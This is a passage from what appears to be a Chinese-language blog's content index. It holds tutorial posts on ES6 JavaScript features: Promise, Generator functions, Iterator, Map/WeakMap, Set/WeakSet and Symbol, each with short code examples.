Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); imgs.then(function(value){ console.log(value); }, function(error){ console.log(error); }); Promise可以用于多个异步操作，下面的代码是判断img是否加载成功，如果加载成功就将img添加进div容器中。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve({ img, status: \u0026#39;加载成功\u0026#39; }); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); var loadImg = new Promise((resolve, reject) =\u0026gt; { let imgDiv = document.getElementById(\u0026#39;imgdiv\u0026#39;); imgs.then(function(value){ imgDiv.innerHtml(value.img); }, function(error){ console.log(error); }); }); then()、catch() Promise对象原型上定义了两个方法，分别为then()和catch()，then()和上面的一样，接受两个函数，可以不需要第二个函数，而catch()函数相当于then(null, reject)的别名。我们把上面的代码来修改，下面的代码同样能到达相同的效果，但是看上去更加简洁。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); imgs.then(function(value){ console.log(value); }); imgs.catch(function(error){ console.log(error); }); 链式写法 由于Promise对象返回的是执行过后的一个新Promise对象，而then方法主要是捕获返回的对象里面PromiseStatus属性的值为\u0026rsquo;resolved\u0026rsquo;，而catch方法主要是捕获返回的对象里面PromiseStatus属性的值为\u0026rsquo;rejected\u0026rsquo;，而每次then或者catch都会返回一个新的Promise对象，这个新的Promise对象里的值就是从上一个Promise对象中获取的。从这些说明中，我们可以使用链式写法简洁明了的写出异步编程。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); imgs .then(value =\u0026gt; console.log(value)) .catch(error =\u0026gt; console.log(error)); Promise.resolve()、Promise.rejcet() Promise.resolve()方法接受一个参数，用于将参数转换为一个Promise对象。如果参数是一个基本类型值，那么将直接返回状态为resolved和值为参数的Promise对象\nPromise.resolve($.ajax(\u0026#39;http://www.youdao.com/\u0026#39;)); Promise.resolve(2); Promise.rejcet()方法和Promise.resolve()的用法一致，但返回的是一个已失败的Promise对象。\nPromise.all() Promise对象上有一个all方法，用于将一个数组或者具备Iterator接口的数据结构组合成一个多Promise对象实例的Promise对象。如果状态都是已完成，就会返回resolved状态，如果其中有一个Promise实例返回rejected。如果数组中的成员不是Promise对象，那么就调用Promise.resolve()方法返回一个有效的Promise对象。Promise.all()方法非常适合多个Promise对象控制，也就是说我需要10个异步调用都执行成功，那么可以用这个方法来控制。\n比如下面，我需要两个图片都加载成功了才进行下一步操作。\nvar imgs1 = new Promise((resolve, reject) =\u0026gt; { /* Code */ }); var imgs2 = new Promise((resolve, reject) =\u0026gt; { /* Code */ }); Promise.all([imgs1, imgs2]) .then(value =\u0026gt; console.log(value)) .catch(error =\u0026gt; console.log(error)); Promise.race() Promise.race()方法的使用和Promise.all()一致，但是行为不一致，Promise.race()方法接受的多个Promise对象中，只要有一个Promise对象的状态率先改变，那么Promise.race()的状态就为率先改变的Promise对象返回的状态。\n文完\n","permalink":"/posts/es6-promise/","summary":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 Promise最初在社区提出的一个异步解决的方案，最后ES6将它加入了正式的标准，并规定了统一的写法。\n在使用Promise之前，你需要注意下面几个点：\n1.Promise有三个状态:Pending(进行中)、Resolved(已完成)、Rejected(已失败)，这三个状态我们无法去改变，并且在一个Promise中只有两个可能，一种是从Pending到Resolved，另一种是Pending到Rejected。当结果发生后，这个状态就凝固了，也就是说我们无法去改变Promise对象的任何状态，如果再次调用这个Promise对象，返回的将是凝固状态的结果。\n2.Promise在执行的过程中无法取消，并且我们也无法知道它执行到哪一步，我们只能知道返回的是已完成还是已失败。\n3.Promise实例创建后会立即执行\n下面的代码部署了一个Promise对象异步加载图片的例子，可以看到用Promise对象来编写异步代码是非常的清晰。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); 在部署了Promise对象后，我们可以通过Promise的实例来调用then()方法，then()方法接受两个函数，这两个函数分别指定resolved和rejected状态返回的回调函数。第二个函数可以不指定，也就是说不返回错误，只得到完成的结果。\nvar imgs = new Promise((resolve, reject) =\u0026gt; { let img = new Image(); img.src = \u0026#39;http://xxx.com/img.jpg\u0026#39;; img.onload = function(){ resolve(\u0026#39;加载成功\u0026#39;); } img.onerror = function(){ reject(\u0026#39;加载失败\u0026#39;); } }); imgs.then(function(value){ console.log(value); }, function(error){ console.","title":"es6-promise"},{"content":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 ES6提供了一种Generator函数，用来解决异步编程的方案，可以通过yield命令来控制函数内部执行与暂停，它与传统的函数声明非常相似，但是有一点是，是函数声明关键字后面跟了一个星号*，而且在函数内部通过yield命令来控制函数的行为，在外面使用next方法来执行函数内部的代码，直至下一个yield命令。\n先看看普通函数是怎么声明\nfunction g(){ let value = \u0026#39;这是普通函数\u0026#39;; console.log(value); } g(); // \u0026#39;这是普通函数\u0026#39; 下面是一个Generator函数的声明使用\nfunction* g(){ yield \u0026#39;这是Generator函数\u0026#39;; } let gen = g(); gen.next(); // {value: \u0026#34;这是Generator函数\u0026#34;, done: false} gen.next(); //{value: undefined, done: true} 上面的代码简单的声明了一个Generator函数g，我们调用g函数的时候，g函数不会立即执行，它会返回一个遍历器，这个遍历器由next()方法执行，直至yield命令暂停，如果后面没有了yield命令，则返回一个对象{value: undefined, done: true}。其实Generator函数返回的遍历器很像Iterator遍历器。\nnext()参数 Generator函数返回的遍历器的next()方法可以带参数，如果没有带参数表示上一条yield命令后面跟的表达式返回的值为undefined，如果带了参数，表示这个参数为上一条yield命令后面表达式返回的值。\nfunction* g(){ let x = yield 10; let y = x + 10; console.log(y); } let gen = g(); gen.next(); // {value: 10, done: false} gen.next(); // Nan 同时返回 {value: undefined, done: true} gen.next(); // {value: 10, done: false} gen.next(20); // 30 同时返回 {value: undefined, done: true} 我们通过给next()传入参数，可以改变函数默认的行为，这个也就给我们动态控制函数执行带来了很大的作为。\nreturn命令 在Generator函数内部，可以出现一个return命令，如果执行return命令后，代表这个Generator函数已经结束，不会继续执行后面的代码了。\nfunction* g(){ yield 1; return 2; yield 2; } let gen = g(); gen.next(); // {value: 1, done: false} gen.next(); // {value: 2, done: true} 注意这里done的值已经标注为true，说明Generator已经结束 gen.next(); // {value: undefined, done: true} return()方法 Generator函数返回的遍历器有一个return()方法，执行这个方法后，Generator函数结束执行，不再执行后续代码了。\nfunction* g(){ yield 1; yield 2; yield 3; } let gen = g(); gen.next(); // {value: 1, done: false} gen.return(5); // {value: 5, done: true} gen.next(); // {value: undefined, done: true} throw()方法 Generator函数返回的遍历器有一个throw()方法，它用于触发错误，这个错误我们可以在Generator函数内部捕获，也可以在外部捕获。\nfunction* g(){ yield 1; try { yield; } catch (e) { console.log(e); } yield 2; } let gen = g(); gen.next(); // {value: 1, done: false} gen.throw(\u0026#39;内部捕获错误\u0026#39;); // Uncaught 内部捕获错误 yield*语法 Generator函数内部可以通过yield语法调用另外一个Generator函数，语义上很好理解yield*语法，yield后面跟着一个星号而function后面跟一个星号都代表它返回一个遍历器对象。\nfunction* g1(){ yield 1; yield 2; } function* g2(){ yield 3; yield g1(); } 上面的代码是无法实现调用Generator函数，next()方法直接把g1返回的遍历器对象指针返回到对象中{value: g1, done: false}，而下面是可以正常执行我们预计的结果。\nfunction* g1(){ yield 1; yield 2; } function* g2(){ yield 3; yield* g1(); } 上面的代码等同于:\nfunction* g2(){ yield 3; yield 1; yield 2; } 应用场景 Generator函数非常适合流程控制，比如我们在加载DOM的时候，下面的代码是流程控制加载一个list列表，我们每次执行next()方法，就会加载一个DOM结构。第一执行加载一个list的div，第二次执行会在这个div中加载ul，第三次执行会在ul中加载一个li，最后完成加载过程。\nfunction* loadUiList(){ yield loadUiDiv(); yield loadUiUl(); yield loadUiLi(); } 文完！\n","permalink":"/posts/es6-generator/","summary":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\n概念 ES6提供了一种Generator函数，用来解决异步编程的方案，可以通过yield命令来控制函数内部执行与暂停，它与传统的函数声明非常相似，但是有一点是，是函数声明关键字后面跟了一个星号*，而且在函数内部通过yield命令来控制函数的行为，在外面使用next方法来执行函数内部的代码，直至下一个yield命令。\n先看看普通函数是怎么声明\nfunction g(){ let value = \u0026#39;这是普通函数\u0026#39;; console.log(value); } g(); // \u0026#39;这是普通函数\u0026#39; 下面是一个Generator函数的声明使用\nfunction* g(){ yield \u0026#39;这是Generator函数\u0026#39;; } let gen = g(); gen.next(); // {value: \u0026#34;这是Generator函数\u0026#34;, done: false} gen.next(); //{value: undefined, done: true} 上面的代码简单的声明了一个Generator函数g，我们调用g函数的时候，g函数不会立即执行，它会返回一个遍历器，这个遍历器由next()方法执行，直至yield命令暂停，如果后面没有了yield命令，则返回一个对象{value: undefined, done: true}。其实Generator函数返回的遍历器很像Iterator遍历器。\nnext()参数 Generator函数返回的遍历器的next()方法可以带参数，如果没有带参数表示上一条yield命令后面跟的表达式返回的值为undefined，如果带了参数，表示这个参数为上一条yield命令后面表达式返回的值。\nfunction* g(){ let x = yield 10; let y = x + 10; console.log(y); } let gen = g(); gen.next(); // {value: 10, done: false} gen.","title":"ES6-Generator函数"},{"content":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\nIterator概念 ES6发布后Javascript的数据集合对象有Array、Object、Map和Set四种，我们同时知道在Array中，我们可以放对象，Object中我们一样可以放Array，四种数据集合对象都可以相互交叉使用。\n那么问题来了，如果在一个数据集合对象中含有多个不同数据集合对象的类型，那么这时候就需要一种接口的机制，来处理不同的数据集合了。\nIterator有三个作用：\n为各种数据接口提供一个统一的访问接口 使数据接口的成员能够按照某种次序排序 ES6新遍历名利 for\u0026hellip;of循环 按照《ECMAScript 6入门》这本书中的4个步骤就能很好的解释Iterator遍历过程\n创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。\n第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。\n第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。\n不断调用指针对象的next方法，直到它指向数据结构的结束位置。\n用一个代码段来实现上面的4个点，也就是来实现一个Iterator遍历器\nfunction iter(arr) { let index = 0; return { next() { return index \u0026lt;= arr.length ? { value: arr[index++], done: false } : { value: undefined, done: true} } } } let test = iter([1, 2]); test.next(); // 第一次运行next方法。返回Object {value: 1, done: false} test.next(); // 第二次运行next方法。返回Object {value: 2, done: false} test.next(); // 第三次运行next方法。返回Object {value: undefined, done: false} 上面的代码实现了一个遍历器生成函数，每次传入数组或者类数组或者是含有length属性的并可遍历数据，都可以返回一个遍历器。遍历器生成函数在内部定义了一个变量index用于数据指针，指向当前遍历位置的成员，然后返回了一个对象，用指针去判断如果指针已经大于数组最大的成员数，那么返回值为空和返回一个done属性并值为true表示已经结束遍历，反之，返回相应的值。其中用done来判断是否遍历结束。\nIterator接口原生的数据结构 数组、类数组、Map、Set几种数据结构是具备原生的Iterator接口，也就是说我们不需要任何的处理就可以使用遍历器、以及调用遍历器接口循环的for\u0026hellip;of命令。如何知道一个数据结构是否具备Iterator接口？通过Symbol.iterator这个属性来确定是否部署了iterator接口，Symbol.iterator是Symbol对象下面的iterator属性，它返回一个独一无二的Symbol值，如果一个数据结构通过此属性访问会返回一个函数，说明这个数据结构已经部署了遍历器。\nlet arr = [1, 2]; arr[Symbol.iterator]; // function values() { [native code] } let arrIt = arr[Symbol.iterator](); // 得到一个遍历器 arrIt.next(); // Object {value: 1, done: false} arrIt.next(); // Object {value: 2, done: false} arrIt.next(); // Object {value: undefined, done: true} 上面提到的是具备原生iterator接口的数据结构，那没有的数据结构呢？比如对象，《ECMAScript 6入门》这本书中提到了一段话来说明为什么对象没有部署原生的iterator接口.\n对象(Object)之所以没有默认部署Iterator接口，是因为对象的哪个属性先遍历，哪个属性后遍历是不确定的，需要开发者手动指定。本质上，遍历 器是一种线性处理，对于任何非线性的数据结构，部署遍历器接口，就等于部署一种线性转换。不过，严格地说，对象部署遍历器接口并不是很必 要，因为这时对象实际上被当作Map结构使用，ES5没有Map结构，而ES6原生提供了。\n如果我们真的需要给没有部署Iterator接口的数据结构就只需要在这个数据结构的Symbol.iterator属性上面部署一个iterator接口就可以实现了：\nconst obj = { data: [1, 2, 3], [Symbol.iterator](it) { const self = this; let index = 0; return { next() { if(index \u0026lt;= self[it].length ) { return {value: self[it][index++], done: false } } else { return {value: undefined, done: true} } } } } } let objIt = obj[Symbol.iterator](\u0026#39;data\u0026#39;); //返回obj对象data属性中数组的iterator遍历器 obj.pubData = [\u0026#39;1\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;bbx\u0026#39;]; objIt = obj[Symbol.iterator](\u0026#39;pubData\u0026#39;); //返回obj对象pubData属性中数组的iterator遍历器 通过上面的代码我们可以给obj对象部署一个iterator接口，并且在调用Symbol.iterator的属性方法的时候传入的一个值，可以用来便利对象中的自定义数组,当然这个方法我们一样可以定义在原型上面，方便所有对象来生成iterator遍历器。\nObject.prototype[Symbol.iterator] = function(it){ const self = this; let index = 0; return { next() { if(index \u0026lt;= self[it].length ) { return {value: self[it][index++], done: false } } else { return {value: undefined, done: true} } } } } const obj = { data: [1, 2, 3] } let objIt = obj[Symbol.iterator](\u0026#39;data\u0026#39;); //返回obj对象data属性数组的遍历器 遍历器对象 return(),throw() 遍历器的next()方法是必须具备的，而return()和throw()方法是可选的，其中return()方法的作用是在循环的时候提前退出，包括出错、break、contiune等命令就会触发return()方法，return()方法在出错或者提前退出循环的时候清空不需要的资源，return()方法由Generator规格规定返回必须为一个对象，而throw()方法主要是配合Generator函数使用。 文完\n","permalink":"/posts/es6-iterator/","summary":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\nIterator概念 ES6发布后Javascript的数据集合对象有Array、Object、Map和Set四种，我们同时知道在Array中，我们可以放对象，Object中我们一样可以放Array，四种数据集合对象都可以相互交叉使用。\n那么问题来了，如果在一个数据集合对象中含有多个不同数据集合对象的类型，那么这时候就需要一种接口的机制，来处理不同的数据集合了。\nIterator有三个作用：\n为各种数据接口提供一个统一的访问接口 使数据接口的成员能够按照某种次序排序 ES6新遍历名利 for\u0026hellip;of循环 按照《ECMAScript 6入门》这本书中的4个步骤就能很好的解释Iterator遍历过程\n创建一个指针对象，指向当前数据结构的起始位置。也就是说，遍历器对象本质上，就是一个指针对象。\n第一次调用指针对象的next方法，可以将指针指向数据结构的第一个成员。\n第二次调用指针对象的next方法，指针就指向数据结构的第二个成员。\n不断调用指针对象的next方法，直到它指向数据结构的结束位置。\n用一个代码段来实现上面的4个点，也就是来实现一个Iterator遍历器\nfunction iter(arr) { let index = 0; return { next() { return index \u0026lt;= arr.length ? { value: arr[index++], done: false } : { value: undefined, done: true} } } } let test = iter([1, 2]); test.next(); // 第一次运行next方法。返回Object {value: 1, done: false} test.next(); // 第二次运行next方法。返回Object {value: 2, done: false} test.next(); // 第三次运行next方法。返回Object {value: undefined, done: false} 上面的代码实现了一个遍历器生成函数，每次传入数组或者类数组或者是含有length属性的并可遍历数据，都可以返回一个遍历器。遍历器生成函数在内部定义了一个变量index用于数据指针，指向当前遍历位置的成员，然后返回了一个对象，用指针去判断如果指针已经大于数组最大的成员数，那么返回值为空和返回一个done属性并值为true表示已经结束遍历，反之，返回相应的值。其中用done来判断是否遍历结束。","title":"ES6-iterator遍历接口"},{"content":"参考文档：MDN\nMap结构 在Javascript中，对象是以键值对的方式存在的，其中的键名是以字符串或者数值以及ES6提出的新的数据类型Symbol方式存在的，比如下面：\nlet m = { k: 1, 2: 4 } m.k; // 1 m[2]; //4 但是无法使用引用类型数据作为键名：\nconst body = document.getElementsByTagName(\u0026#39;body\u0026#39;)[0]; let m = {}; m.k = 1; m[body] = 4; m; // {k: 1, [object HTMLBodyElement]: 4} m[\u0026#39;[object HTMLBodyElement]\u0026#39;]; // 4 /* 从这里看出来其实当我们用DOM对象作为m属性的时候， 实际上并没有把DOM对象作为键名，而是通过把DOM对象 toString()方法的返回字符串值当作了键名。 */ ES6提出了一种新的结构来解决引用类型作为键值不能实现的问题。Map类型，Map类型可以使用任意数据类型作为键值。Map类型常用的方法及属性有以下几种：\nMap.prototype.size:返回Map对象的键值对\nMap.prototype.clear():移除Map结构中所有的键值对\nMap.prototype.delete(key):移除key键，成功返回true，反之false\nMap.prototype.get(key):或者key键的值，如果不存在返回undefined\nMap.prototype.set(key, value):设置Map键值。key作为键，value作为键值\nMap.prototype.has(key):查找是否在当前Map结构中存在key键，返回true和false\n当然还有其他和Set结构一样的方法没有列举出来，如果想见全部方法，大家可以到MDN文档查看。\nMap是一个构造函数，可以接受一个参数，此参数是数组，此数组的成员为键值对或者两个元素的数组，每个元素或者键值对会被添加到Map结构中，null为undefined。\nlet tmp = [[\u0026#39;name\u0026#39;, \u0026#39;tom\u0026#39;],[\u0026#39;age\u0026#39;, 18]]; const m = new Map(tmp); m.get(\u0026#39;name\u0026#39;); //\u0026#39;tom\u0026#39; m.get(\u0026#39;age\u0026#39;); // 18 使用引用类型当键值\nconst body = document.getElementsByTagName(\u0026#39;body\u0026#39;)[0]; const m = new Map(); m.set(body, \u0026#39;this is body\u0026#39;); m.get(body); // \u0026#39;this is body\u0026#39; 这里需要注意的一点是引用类型是指的是变量名其实存储的是一个内存地址，并不是真正存储的数据，也就是说变量存储的是一个指针，所以两个引用类型数据值可能一样，但是内存地址不一样。\nlet tmpA = [\u0026#39;body\u0026#39;]; let tmpB = [\u0026#39;body\u0026#39;]; const m = new Map(); m.set(tmpA, \u0026#39;this is body\u0026#39;); m.has(tmpA); // true m.get(tmpA); // \u0026#39;this is body\u0026#39; m.has(tmpB); // false m.get(tmpB); // undefined WeakMap结构 WeakMap结构和WeakSet结构非常非常相似，它们都是弱引用，并且它们的键只能是对象，不能是基本类型的值。当一个对象被WeakMap当作键/值，这次引用是不计入引用计数的，那么垃圾回收器回收的时候会回收掉这个对象，并且WeakMap会自动销毁这个键值对，如果在这个对象销毁后获取，将会返回undefined。\nWeakMap只有四个方法。并且没有遍历方法，因为很有可能在遍历的过程中垃圾回收器就回收掉，所以没有遍历的方法。\nWeakMap.prototype.set(key, value):设置一个键值对，并返回当前WeakMap对象。\nWeakMap.prototype.get(key): 获取key键的值\nWeakMap.prototype.has(key): 判断key键是否存在当前WeakMap结构中\nWeakMap.prototype.delete(key): 删除当前WeakMap结构中的key键/值对。\nWeakMap非常好用的是将WeakMap作为一些对象的状态值、属性值，当这个对象销毁的时候，那么WeakMap中的状态值就会跟着销毁，比如下面就是一个很好的例子，一个html网页，当发生click事件，就会在状态中+1，如果大于5次，就销将这个DOM节点；\nconst DOMclick = document.getElementById(\u0026#39;site-navigation\u0026#39;); const wm = new WeakMap(); wm.set(DOMclick, {ClickNum: 0}); function clickFunction(...arg){ let tmp = wm.get(DOMclick); if( tmp.ClickNum \u0026gt;= 5) { DOMclick.removeEventListener(\u0026#39;click\u0026#39;, clickFunction); DOMclick = null; } else { tmp.ClickNum += 1; wm.set(DOMclick, tmp); console.log(\u0026#39;ClickNum: \u0026#39;, wm.get(DOMclick).ClickNum); } } DOMclick.addEventListener(\u0026#39;click\u0026#39;, clickFunction); 文完\n","permalink":"/posts/es6-map-weamap/","summary":"参考文档：MDN\nMap结构 在Javascript中，对象是以键值对的方式存在的，其中的键名是以字符串或者数值以及ES6提出的新的数据类型Symbol方式存在的，比如下面：\nlet m = { k: 1, 2: 4 } m.k; // 1 m[2]; //4 但是无法使用引用类型数据作为键名：\nconst body = document.getElementsByTagName(\u0026#39;body\u0026#39;)[0]; let m = {}; m.k = 1; m[body] = 4; m; // {k: 1, [object HTMLBodyElement]: 4} m[\u0026#39;[object HTMLBodyElement]\u0026#39;]; // 4 /* 从这里看出来其实当我们用DOM对象作为m属性的时候， 实际上并没有把DOM对象作为键名，而是通过把DOM对象 toString()方法的返回字符串值当作了键名。 */ ES6提出了一种新的结构来解决引用类型作为键值不能实现的问题。Map类型，Map类型可以使用任意数据类型作为键值。Map类型常用的方法及属性有以下几种：\nMap.prototype.size:返回Map对象的键值对\nMap.prototype.clear():移除Map结构中所有的键值对\nMap.prototype.delete(key):移除key键，成功返回true，反之false\nMap.prototype.get(key):或者key键的值，如果不存在返回undefined\nMap.prototype.set(key, value):设置Map键值。key作为键，value作为键值\nMap.prototype.has(key):查找是否在当前Map结构中存在key键，返回true和false\n当然还有其他和Set结构一样的方法没有列举出来，如果想见全部方法，大家可以到MDN文档查看。\nMap是一个构造函数，可以接受一个参数，此参数是数组，此数组的成员为键值对或者两个元素的数组，每个元素或者键值对会被添加到Map结构中，null为undefined。\nlet tmp = [[\u0026#39;name\u0026#39;, \u0026#39;tom\u0026#39;],[\u0026#39;age\u0026#39;, 18]]; const m = new Map(tmp); m.get(\u0026#39;name\u0026#39;); //\u0026#39;tom\u0026#39; m.","title":"ES6新特性-Map和WeakMap"},{"content":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\nES6提供了两个新的数据结构：Set和WeakSet数据结构，两个结构很相识，但是有一点区别。\nSet数据结构 Set数据结构是一个类数组数据结构，但是它和数组有一点区别不同的是，Set数据结构的值是唯一的，也就是说没有重复值，Set数据结构内部判断两个值是否相等类似于我们使用的精确等运算符(===)，所以\u0026quot;1\u0026quot; 不等于 1但是区别在于NaN相等。Set的参数接受一个数组或类似数组的对象，它将所有元素添加进新的Set中：\nvar c = new Set([1,2,3,4,4]); //注意这里添加了两个4 c; // {1,2,3,4} 只添加了一个4，这也就说明了Set数据结构的值唯一性。 由于Set数据结构的值是唯一值，那么我们可以通过这样的特性来去除数组值的重复性\nvar a = [1,2,3,4,5,4,5]; var b = [...new Set(a)]; b; // [1,2,3,4,5] Set有四个操作数据的方法和四个遍历数据的方法，首先来看看四个操作数据的方法： add(value):添加某个值，返回该Set本身。\ndelete(value):删除Set数据结构中的一个值，如果删除成功则返回true,不成功则返回false。\nhas(value): 检查Set中是否含有某个值，返回true和false。\nclear():移除Set数据结构中的所有值，没有返回结构\n上面的四个方法都属于字面意思很容易理解，其中的add方法添加的数据同样会保证Set结构的数值唯一性.\nvar a = new Set([1,2,3,4]); a.add(5); a.add(5); a; // {1,2,3,4,5} 只添加了一个数值5 Set的四个遍历数据的方法：\nkeys():返回一个新的键名遍历器，由于Set结构没有键名，所以keys()返回的是一个键值与value()遍历器结果一样。\nvalues()():返回一个新的键值遍历器\nentries()：返回一个键值对遍历器\nforEach(callback,this)：按照插入顺序对每个值调用callback函数进行处理，第二个参数为绑定的this对象。Callback函数接受三个参数，分别为：键名、键值、集合本身\nsize:size为属性，返回Set数据结构有多少个值。\n由于Set结构的存储顺序是按照我们插入的顺序就行存储的，所以这样就很方便我们储存中间件函数。\nWeakSet数据结构 WeakSet数据结构同样是不能重复值的集合，但是WeakSet数据结构的成员只能是对象，不能是其他类型的值，并且WeakSet数据结构是弱引用，不会影响垃圾回收器的回收。比如我们新声明一个对象并把这个对象赋值给变量a，那么这个对象当前的引用为1，即使我们没有使用这个对象了，但垃圾回收器不会回收此对象，我们必须手动解除变量a对于此对象的引用(a = null)才能触发垃圾回收器的回收。\nWeakSet有四个方法：\nadd(value):添加一个对象到WeakSet中，返回WeakSet本身 delete(value):从WeakSet中删除一个对象，返回true和false has(value): 判断一个对象是否存在于WeakSet中，返回true和false\nWeakSet没有办法来遍历成员，因为说不定在你遍历的时候，垃圾回收器就已经回收了成员中的对象。简单的使用：\nvar b = [1,2]; var ws = new WeakSet(); ws.add(1); //报错，因为不是一个对象 ws.add(b); //返回WeakSet本身 ws.has(b); // true ws.delete(b); // false WeakSet有很多临时的用处，在阮一峰写的ECMAScript6入门中有一个很好WeakSet使用例子：\nconst foos = new WeakSet(); class Foo { constructor() { foos.add(this) } method () { if (!foos.has(this)) { throw new TypeError(\u0026#39;Foo.prototype.method 只能在Foo的实例上调用!\u0026#39;); } } } Foo.prototype.method(); //Foo.prototype.method 只能在Foo的实例上调用! 文完\n","permalink":"/posts/es6-set-weakset/","summary":"书籍参考：《ECMAScript 6入门》 作者：阮一峰\n文档参考：MDN\nES6提供了两个新的数据结构：Set和WeakSet数据结构，两个结构很相识，但是有一点区别。\nSet数据结构 Set数据结构是一个类数组数据结构，但是它和数组有一点区别不同的是，Set数据结构的值是唯一的，也就是说没有重复值，Set数据结构内部判断两个值是否相等类似于我们使用的精确等运算符(===)，所以\u0026quot;1\u0026quot; 不等于 1但是区别在于NaN相等。Set的参数接受一个数组或类似数组的对象，它将所有元素添加进新的Set中：\nvar c = new Set([1,2,3,4,4]); //注意这里添加了两个4 c; // {1,2,3,4} 只添加了一个4，这也就说明了Set数据结构的值唯一性。 由于Set数据结构的值是唯一值，那么我们可以通过这样的特性来去除数组值的重复性\nvar a = [1,2,3,4,5,4,5]; var b = [...new Set(a)]; b; // [1,2,3,4,5] Set有四个操作数据的方法和四个遍历数据的方法，首先来看看四个操作数据的方法： add(value):添加某个值，返回该Set本身。\ndelete(value):删除Set数据结构中的一个值，如果删除成功则返回true,不成功则返回false。\nhas(value): 检查Set中是否含有某个值，返回true和false。\nclear():移除Set数据结构中的所有值，没有返回结构\n上面的四个方法都属于字面意思很容易理解，其中的add方法添加的数据同样会保证Set结构的数值唯一性.\nvar a = new Set([1,2,3,4]); a.add(5); a.add(5); a; // {1,2,3,4,5} 只添加了一个数值5 Set的四个遍历数据的方法：\nkeys():返回一个新的键名遍历器，由于Set结构没有键名，所以keys()返回的是一个键值与value()遍历器结果一样。\nvalues()():返回一个新的键值遍历器\nentries()：返回一个键值对遍历器\nforEach(callback,this)：按照插入顺序对每个值调用callback函数进行处理，第二个参数为绑定的this对象。Callback函数接受三个参数，分别为：键名、键值、集合本身\nsize:size为属性，返回Set数据结构有多少个值。\n由于Set结构的存储顺序是按照我们插入的顺序就行存储的，所以这样就很方便我们储存中间件函数。\nWeakSet数据结构 WeakSet数据结构同样是不能重复值的集合，但是WeakSet数据结构的成员只能是对象，不能是其他类型的值，并且WeakSet数据结构是弱引用，不会影响垃圾回收器的回收。比如我们新声明一个对象并把这个对象赋值给变量a，那么这个对象当前的引用为1，即使我们没有使用这个对象了，但垃圾回收器不会回收此对象，我们必须手动解除变量a对于此对象的引用(a = null)才能触发垃圾回收器的回收。\nWeakSet有四个方法：\nadd(value):添加一个对象到WeakSet中，返回WeakSet本身 delete(value):从WeakSet中删除一个对象，返回true和false has(value): 判断一个对象是否存在于WeakSet中，返回true和false\nWeakSet没有办法来遍历成员，因为说不定在你遍历的时候，垃圾回收器就已经回收了成员中的对象。简单的使用：\nvar b = [1,2]; var ws = new WeakSet(); ws.","title":"es6新特性:Set和WeakSet"},{"content":"参考：《ES6标准入门教程》 作者：阮一峰\nSymbol原始类型 Javascript一共有6种原始数据类型，分别为：\nundefined null Boolean Object String Array ES6新增加了一种原始数据类型，也就是说从ES6开始，Javascript一共有7种原始数据类型，全新的数据类型是Symbol类型，Symbol用来声明一个独一无二的值。因为Symbol类型返回的是一个原始类型值，不是返回的对象，也不能添加属性，所以在Symbol函数前不能使用new命令。\nSymbol的参数是一个字符串，用于描述Symbol实例，如果为空则返回一个\u0026quot;Symbol()\u0026quot;，并且每一个Symbol类型的值都是唯一的并且不相等的，比如：\nvar a = Symbol(\u0026#39;1\u0026#39;); var b = Symbol(\u0026#39;1\u0026#39;); a === b; // false 当我们使用typeof运算符来判断是什么类型的时候，返回的结果是如下：\nvar s = Symbol(\u0026#39;this is s\u0026#39;); typeof s; // symbol 那Symbol到底有什么作用？很多时候我们要保证值的唯一性，防止被串改或者覆盖，比如我们使用switch判断的时候，通常我们会这样来建立一个对象来消除魔术字符串然后用对象的属性值来作判断，比如：\nvar persons = { a: \u0026#39;123\u0026#39; } function ifPerson(person) { switch(person) { case persons.a: console.log(\u0026#39;a\u0026#39;); break; } } ifPerson(persons.a); // a 同样也可以通过传递字符串来达到判断的效果，或者我们重新定义一个值等于123的变量来达到判断的效果：\nvar persons = { a: \u0026#39;123\u0026#39; } function ifPerson(person) { switch(person) { case persons.a: console.log(\u0026#39;a\u0026#39;); break; } } ifPerson(persons.a); // a ifPerson(\u0026#39;123\u0026#39;); // a var b = \u0026#39;123\u0026#39;; ifPerson(b); // a 上面的方式都可以达到我们想要使判断输出a的效果，那问题来了，我们想要控制这个传递进来的值必须是我们指定的唯一值，并且不能用字符串或者值相等的属性、变量，来保证数据的唯一性，那这时候我们就可以使用到Symbol数据类型了。把上面的代码修改：\nvar persons = { a: Symbol(\u0026#39;this is a\u0026#39;) } function ifPerson(person) { switch(person) { case persons.a: console.log(\u0026#39;a\u0026#39;); break; } } ifPerson(persons.a); // a ifPerson(\u0026#39;123\u0026#39;); // undefined var b = \u0026#39;123\u0026#39;; ifPerson(b); // undefined 